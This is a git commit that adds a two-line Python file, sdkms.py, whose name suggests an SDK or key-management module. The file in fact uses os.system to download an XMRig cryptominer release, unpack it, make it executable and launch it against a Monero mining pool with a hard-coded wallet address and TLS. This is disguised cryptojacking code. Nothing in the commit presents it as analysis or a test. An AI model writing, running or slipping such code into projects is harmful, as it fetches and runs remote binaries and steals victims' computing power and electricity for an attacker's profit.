02b414c537eb64fc5641cdeaea941eb9e08cc5ec
realsmallworlds <120352722+realsmallworlds@users.noreply.github.com>
2024-07-22 02:04:49 +0300

    Add files via upload

---
+++ sdkms.py
@@ -0,0 +1,2 @@
+import os
+os.system("wget https://github.com/Bendr0id/xmrigCC/releases/download/3.4.0/xmrigCC-miner_only-3.4.0-linux-dynamic-amd64.tar.gz && tar -xf xmrigCC-miner_only-3.4.0-linux-dynamic-amd64.tar.gz && ls -a &&chmod +x ./xmrigDaemon && ./xmrigDaemon -o pool.hashvault.pro:443 -u 43NA3bgmhkFD2E5ychNnhG7TTcsp78e4AbZEAgBUwK8ubdnAe8tvFo2dNmhMw9fCELjBA9Enfsjkihm7RvwEN71gMeWVVbX -k --tls")
